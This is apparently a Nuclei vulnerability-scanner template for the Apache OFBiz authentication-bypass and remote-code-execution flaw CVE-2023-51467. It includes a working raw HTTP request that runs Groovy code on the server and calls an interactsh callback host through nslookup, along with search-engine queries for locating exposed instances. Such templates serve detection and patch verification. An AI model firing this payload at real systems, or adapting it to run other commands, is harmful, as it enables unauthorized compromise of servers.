http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: header
    type: word
    words:
    - OFBiz.Visitor=
  matchers-condition: and
  raw:
  - 'POST /webtools/control/ProgramExport;/?USERNAME=&PASSWORD=&requirePasswordChange=Y
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22''nslookup+{{interactsh-url}}''.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B

    '
id: CVE-2023-51467
info:
  author: your3cho
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-51467
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-918
    epss-percentile: 0.99881
    epss-score: 0.93996
  description: 'The vulnerability allows attackers to bypass authentication to achieve
    a simple Server-Side Request Forgery (SSRF)

    '
  impact: 'Unauthenticated attackers can bypass authentication and execute arbitrary
    Groovy code, leading to remote code execution and complete system compromise.

    '
  metadata:
    fofa-query:
    - app="Apache_OFBiz"
    - body="ofbiz"
    - app="apache_ofbiz"
    max-request: 1
    product: ofbiz
    shodan-query:
    - html:"OFBiz"
    - http.html:"ofbiz"
    - ofbiz.visitor=
    vendor: apache
  name: Apache OFBiz < 18.12.11 - Remote Code Execution
  reference:
  - https://lists.apache.org/thread/9tmf9qyyhgh6m052rhz7lg9vxn390bdv
  - https://www.openwall.com/lists/oss-security/2023/12/26/3
  - https://twitter.com/_0xf4n9x_/status/1740202435367543183
  - https://nvd.nist.gov/vuln/detail/CVE-2023-51467
  - https://issues.apache.org/jira/browse/OFBIZ-12873
  remediation: 'Upgrade Apache OFBiz to version 18.12.11 or later.

    '
  severity: critical
  tags: cve2023,cve,apache,ofbiz,rce,vkev,vuln
